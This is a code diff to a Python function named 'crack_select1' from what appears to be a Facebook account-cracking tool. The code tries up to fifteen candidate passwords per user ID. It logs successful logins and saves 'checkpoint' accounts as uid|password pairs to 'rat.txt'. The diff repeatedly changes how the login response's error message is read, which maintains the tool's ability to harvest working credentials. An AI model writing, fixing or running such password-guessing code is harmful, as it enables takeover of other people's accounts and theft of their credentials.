@@ -315,7 +315,7 @@ def crack_select1():
 				ok.close()
 				oks.append(uid+pass1)
 			else:
-				if "www.facebook.com" in data.json()['error_msg']:
+				if "www.facebook.com" in q['error_msg']:
 					print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("rat.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
@@ -332,7 +332,7 @@ def crack_select1():
 						ok.close()
 						oks.append(uid+pass2)
 					else:
-						if "www.facebook.com" in data.json()['error_msg']:
+						if "www.facebook.com" in q['error_msg']:
 							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("rat.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
@@ -349,7 +349,7 @@ def crack_select1():
 								ok.close()
 								oks.append(uid+pass3)
 							else:
-								if "www.facebook.com" in data.json()['error_msg']:
+								if "www.facebook.com" in q['error_msg']:
 									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("rat.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
@@ -366,7 +366,7 @@ def crack_select1():
 										ok.close()
 										oks.append(uid+pass4)
 									else:
-										if "www.facebook.com" in data.json()['error_msg']:
+										if "www.facebook.com" in q['error_msg']:
 											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("rat.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
@@ -383,7 +383,7 @@ def crack_select1():
 												ok.close()
 												oks.append(uid+pass5)
 											else:
-												if "www.facebook.com" in data.json()['error_msg']:
+												if "www.facebook.com" in q['error_msg']:
 													print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("rat.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
@@ -400,7 +400,7 @@ def crack_select1():
 														ok.close()
 														oks.append(uid+pass6)
 													else:
-														if "www.facebook.com" in data.json()['error_msg']:
+														if "www.facebook.com" in q['error_msg']:
 															print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("rat.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
@@ -417,7 +417,7 @@ def crack_select1():
 																ok.close()
 																oks.append(uid+pass7)
 															else:
-																if "www.facebook.com" in data.json()['error_msg']:
+																if "www.facebook.com" in q['error_msg']:
 																	print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("rat.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
@@ -434,7 +434,7 @@ def crack_select1():
 																		ok.close()
 																		oks.append(uid+pass8)
 																	else:
-																		if "www.facebook.com" in data.json()['error_msg']:
+																		if "www.facebook.com" in q['error_msg']:
 																			print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass8+"\033[0;97m")
 																			cp = open("rat.txt", "a")
 																			cp.write(uid+"|"+pass8+"\n")
@@ -451,7 +451,7 @@ def crack_select1():
 																  			    ok.close()
 																  			    oks.append(uid+pass9)
 																			else:
-																  			        if "www.facebook.com" in data.json()['error_msg']:
+																  			        if "www.facebook.com" in q['error_msg']:
 																  			                print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass9+"\033[0;97m")
 																  			                cp = open("rat.txt", "a")
 																  			                cp.write(uid+"|"+pass9+"\n")
@@ -468,7 +468,7 @@ def crack_select1():
 																						ok.close()
 																						oks.append(uid+pass10)
 																  			 		else:
-																  			        		if "www.facebook.com" in data.json()['error_msg']:
+																  			        		if "www.facebook.com" in q['error_msg']:
 																							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass10+"\033[0;97m")
 																							cp = open("rat.txt", "a")
 																							cp.write(uid+"|"+pass10+"\n")
@@ -485,7 +485,7 @@ def crack_select1():
 																								ok.close()
 																								oks.append(uid+pass11)
 																							else:
-																								if "www.facebook.com" in data.json()['error_msg']:
+																								if "www.facebook.com" in q['error_msg']:
 																									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass11+"\033[0;97m")
 																									cp = open("rat.txt", "a")
 																									cp.write(uid+"|"+pass11+"\n")
@@ -502,7 +502,7 @@ def crack_select1():
 																										ok.close()
 																										oks.append(uid+pass12)
 																									else:
-																										if "www.facebook.com" in data.json()['error_msg']:
+																										if "www.facebook.com" in q['error_msg']:
 																											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass12+"\033[0;97m")
 																											cp = open("rat.txt", "a")
 																											cp.write(uid+"|"+pass12+"\n")
@@ -519,7 +519,7 @@ def crack_select1():
 																												ok.close()
 																												oks.append(uid+pass13)
 																											else:
-																												if "www.facebook.com" in data.json()['error_msg']:
+																												if "www.facebook.com" in q['error_msg']:
 																													print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass13+"\033[0;97m")
 																													cp = open("rat.txt", "a")
 																													cp.write(uid+"|"+pass13+"\n")
@@ -536,7 +536,7 @@ def crack_select1():
 																														ok.close()
 																														oks.append(uid+pass14)
 																													else:
-																														if "www.facebook.com" in data.json()['error_msg']:
+																														if "www.facebook.com" in q['error_msg']:
 																															print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass14+"\033[0;97m")
 																															cp = open("rat.txt", "a")
 																															cp.write(uid+"|"+pass14+"\n")
@@ -553,7 +553,7 @@ def crack_select1():
 																																ok.close()
 																																oks.append(uid+pass15)
 																															else:
-																																if "www.facebook.com" in data.json()['error_msg']:
+																																if "www.facebook.com" in q['error_msg']:
 																																	print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass15+"\033[0;97m")
 																																	cp = open("rat.txt", "a")
 																																	cp.write(uid+"|"+pass15+"\n")
